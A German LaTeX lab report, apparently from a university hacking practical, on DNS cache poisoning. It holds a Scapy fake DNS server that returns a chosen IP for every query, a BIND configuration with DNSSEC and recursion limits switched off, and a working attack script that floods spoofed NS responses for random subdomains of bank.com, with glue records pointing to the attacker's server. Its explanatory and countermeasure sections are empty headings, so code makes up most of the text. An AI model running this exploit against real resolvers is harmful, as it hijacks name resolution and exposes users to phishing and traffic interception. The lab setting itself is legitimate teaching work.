\documentclass[10pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[german]{babel}
\usepackage[T1]{fontenc}
\usepackage{fullpage}
\usepackage{amssymb}
\usepackage{listings}
\usepackage{caption}
\usepackage{color}
\usepackage{amsmath}
\usepackage{graphicx}
\usepackage{hyperref}

\setlength{\parindent}{0pt}
\setlength{\columnsep}{0.5cm}

\include{pythonColor}
\lstset{language=python-color}
\lstset{framexleftmargin=5pt, framextopmargin=5pt, framexbottommargin=5pt, frame=tb, framerule=0pt}
\definecolor{grey}{rgb}{0.9,0.9,0.9}
\include{pseudo}

\author{Lukas Jung, Marc Narres-Schulz, Oliver Sänger, Tobias Zeimetz}
\title{Teil III: \\DNS Cache Poisoning}

\begin{document}
\maketitle
\newpage

\section{Einleitung}
Bei der vorliegenden Arbeit handelt es sich um ein Protokoll über eine Teilaufgabe im \glqq Hackerpraktikum\grqq. Die erste Aufgabe bestand in der Programmierung eines eigenen DNS-Servers. Der Server wurde in der Programmiersprache Python geschrieben und als Hilfe wurde das Modul Scapy verwendet. Der Python-Server sollte in der Lage sein, auf eine DNS-Anfrage eine entsprechend korrekt geformte Antwort zu senden. Die IP, mit welcher der Python-Server antwortet, sollte selbst einstellbar sein.

Anschließend sollte ein DNS-Server aufgesetzt und konfiguriert werden. Dieser Server sollte später das Ziel des DNS-Cache-Poisoning-Angriffs sein. Die grundlegende Idee bestand darin, erst alle Sicherheitseigenschaften des Servers gegen diesen einen Angriff zu deaktivieren. Anschließend bestand das Ziel darin den Cache des DNS-Servers (Victim-DNS) zu \glqq vergiften\grqq \ und eine fehlerhaften DNS-Auflösung zu injecten. Ferner war das Ziel, den Cache des Victim-DNS so zu manipulieren, dass alle Anfragen an den in Python selbstgeschriebenen DNS-Server (Python-Server oder auch Attacker-DNS) weitergeleitet werden. Dadurch ist es dem Angreifer immer möglich eine andere IP-Adresse für die Auflösung zu wählen. Eine genauer Erläuterung folgt in den nächsten Kapiteln.

Die folgenden Kapitel beschäftigen sich mit den Grundlagen des Angriffs, das heißt wie sollte in der Theorie vorgegangen werden, wie müssen die Abläufe aussehen und was sind die Vorrausetzungen für den Angriff. Außerdem wird der Angriff im Detaill genauer Erklärt. Der nächste Abschnitt besteht aus der Konfiguration der Server, welche Komponenten verwenden wurden und welche Sicherheitsmaßnahmen deaktiviert wurden. Im letzten Kapitel folgt anschließend eine detaillierte Beschreibung unseres Vorgehens, wie unsere Implementierung des Angriffs funktioniert und welche Tests durchgeführt wurden.

\section{Grundlagen des Angriffs}

\section{Konfigurationen der Server und Schnittstellen}
Dieses Kapitel beschäftig sich mit unserer Netzwerkstruktur, den verwenden System und ihren Konfigurationen. Zu erst wird auf den aus Ausgabe 2 in Python implementierten DNS-Server eingegangen. Anschließend werden die Konfigurationen des in Ubuntu aufgesetzten DNS-Servers dargelegt und genauer Erläutert. Im letzten Abschnitt dieses Kapitels wird die Architektur unseren Netwerks dargestellt. Genauer heißt das, wie kommunizieren die einzelnen Parteien miteinander und wie sind sie verbunden.

\subsection{Python DNS-Server}
\begin{center}
\begin{lstlisting}
import os
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import DNS, DNSQR, DNSRR, dnsqtypes

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 53))

fixed_ip = os.environ['ATK_FORGED_IP']

while True:
    # DNS server that resolves every A record to a fixed A:IPV4 response.

    request, addr = sock.recvfrom(4096)

    dns_request = DNS(request)
    assert dns_request.opcode == 0, dns_request.opcode  # QUERY
    assert dnsqtypes[dns_request[DNSQR].qtype] == 'A', dns_request[DNSQR].qtype

    response = DNS(
        id=dns_request.id,  # Query ID / transaction id
        qr=1,  # QR (Query / Response) 1=response
        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
        aa=1,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
        tc=0,
        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a UDP
        # packet response
        rd=0,  # RD (Recursion Desired)
        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
        z=0,  # This is reserved and must be zero
        rcode=0,  # Response code from the server: indicates success or failure
        # "ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 
        # 5:"refused"
        qdcount=1,  # Question record count
        ancount=1,  # Answer count
        nscount=dns_request.nscount,  # authority count
        arcount=dns_request.arcount,  # additional record count
        ad=dns_request.ad,  # DNS Question/Answer data referenced by the count fields above
        cd=dns_request.cd,  # Checking Disabled (0/1)
        # DNS Question Record(s)
        qd=DNSQR(qname=dns_request[DNSQR].qname, qtype='A', qclass='IN'),
        # DNS Resource Record(s)
        an=DNSRR(rrname=dns_request[DNSQR].qname, type='A', rclass='IN', rdata=fixed_ip, 
        	ttl=86400),
        ns=dns_request.ns,
        ar=dns_request.ar
    )

    sock.sendto(bytes(response), addr)
\end{lstlisting}
\end{center}
\subsection{Victim DNS-Server}
\begin{center}
\begin{lstlisting}
options {
    directory "/etc/namedb";
    pid-file "/var/run/named.pid";
    statistics-file "/var/run/named.stats";

    query-source address <ip> port <port_out>;

    dnssec-enable no;

    allow-recursion { any; };
    allow-query { any; };

    auth-nxdomain no;    # conform to RFC1035

    listen-on-v6 { none; };

    listen-on port <port_in> {
        127.0.0.1;
        <ip>;
    };

};
\end{lstlisting}
\end{center}

\subsection{Netzwerkdiagramm}

\section{Der Angriff}
In folgendem Abschnitt wird die praktische Umsetzung des Angriffs genauer dargelegt. Im ersten Unterpunkt wird auf die konkrete Implementierung in Python mithilfe von Scapy eingegangen. Dabei wird dargelegt, was die einzelnen Optionen bedeuten und wie sie zu interpretieren sind. Als nächstes folgt eine Beschreibung unserer Vorgehensweise und welche Versuche und Versuchsreihen durchgeführt wurden. Zum Schluss werden Gegenmaßnahmen aufgezählt, die einen solchen Angriff verhindern sollen.

\subsection{Das Python Programm}
\begin{center}
\begin{lstlisting}
import os
import random
from socket import AF_INET, SOCK_DGRAM, socket

from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sendpfast, Ether

sock = socket(AF_INET, SOCK_DGRAM)
sock.bind((os.environ['ATK_SERVER_IP'], 1234))

# Vulnerable recursive DNS server settings
target_dns_ip = os.environ['VLN_SERVER_IP']
target_dns_port_in = int(os.environ['VLN_DNS_PORT_IN'])
target_dns_port_out = int(os.environ['VLN_DNS_PORT_OUT'])
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
# Target domain base to be messed with
target_domain_base = ".bank.com"
# Authoritative NS for the target domain
known_ns_domain = "ns01.cashparking.com."
known_ns_ip = "216.69.185.38"

# Malicious DNS server
attacker_dns_ip = os.environ['ATK_SERVER_IP']
expected_ip = os.environ['ATK_FORGED_IP']
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
def initial_request(domain, ip, port):
    return Ether() / IP(dst=ip) / UDP(dport=port) / DNS(
        id=42,
        qr=0,
        rd=1,
        ra=0,
        qdcount=1,
        ancount=0,
        nscount=0,
        arcount=0,
        qd=DNSQR(qname=domain, qtype='A', qclass='IN')
    )
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
def forged_ns_response(id, target_domain, target_ip, attacker_dns_ip, known_ns_domain, 
	known_ns_ip, dst_port):
    response = Ether() / IP(src=known_ns_ip, dst=target_ip) / UDP(dport=dst_port) / DNS(
        id=id,  # Query ID / transaction id
        qr=1,  # QR (Query / Response) 1=response
        opcode=0,  # Set by client to 0 for a standard query, 0:"QUERY",1:"IQUERY",2:"STATUS"
        aa=0,  # Set to 1 in a server response if this dns_response is Authoritative, 0 if not.
        tc=0,
        # Set to 1 in a server response if the dns_response can't fit in the 512-byte limit of a 
        # UDP packet response
        rd=1,  # RD (Recursion Desired)
        ra=0,  # RA (Recursion Available), set by server: will (1) or won't (0) support recursion
        z=0,  # This is reserved and must be zero
        rcode=0,  # Response code from the server: indicates success or failure
        # 0:"ok", 1:"format-error", 2:"server-failure", 3:"name-error", 4:"not-implemented", 
        # 5:"refused"
        qdcount=1,  # Question record count
        ancount=0,  # Answer count
        nscount=1,  # authority count
        arcount=1,  # additional record count
        # AD and CD bits are defined in RFC 2535
        ad=0,  # # Authentic Data
        cd=0,  # Checking Disabled (0/1)
        # DNS Question Record
        qd=DNSQR(qname=target_domain, qtype='A', qclass='IN'),
        # DNS Resource Record
        an=0,
        ns=DNSRR(rrname=target_domain, type='NS', rdata=known_ns_domain, ttl=253643),
        ar=DNSRR(rrname=known_ns_domain, type='A', rdata=attacker_dns_ip, ttl=253643)
    )
    return response
\end{lstlisting}
\end{center}
\begin{center}
\begin{lstlisting}
counter = 0
while True:
    target_domain = "www" + str(counter) + target_domain_base
    counter = (counter + 1) % (2 ** 16)

    packet_list = [initial_request(target_domain, target_dns_ip, target_dns_port_in)]

    response_amount = 50
    r = random.randint(0, (2 ** 16) - response_amount + 1)
    for i in range(r, r + response_amount):
        packet_list.append(
            forged_ns_response(i, target_domain, target_dns_ip, attacker_dns_ip, 
            		known_ns_domain, known_ns_ip, target_dns_port_out))

    p_txid_match = (1 / (2 ** 16)) * response_amount * counter * 100
    print("Iteration: {}, possible cache poisoning: {:4.2f}%".format(counter, p_txid_match))
    print("Sending packets from {} with id in interval [{}, {}] to {}"
    	.format(known_ns_ip, r, r + response_amount, target_domain))

    sendpfast(packet_list, pps=100000, iface="eth1", verbose=0)

    dns_response = sr1(IP(dst=target_dns_ip) / UDP(dport=53) / DNS(rd=1, 
    	qd=DNSQR(qname=target_domain)), verbose=0)

    try:
        if dns_response[DNS].an.rdata == expected_ip:
            print("Successfully poisoned the zone of {}".format(target_domain_base))
            break
    except:
        print("Poisoning failed")
    break
\end{lstlisting}
\end{center}

\subsection{Versuchsreihen und Vorgehensweise}
\subsection{Schutz gegen den Angriff}
\subsection*{ID-Randomization}
\subsection*{Vollständige Port Randomization}
\subsection*{Random URL Capitalizing}

\section{Fazit}

\end{document}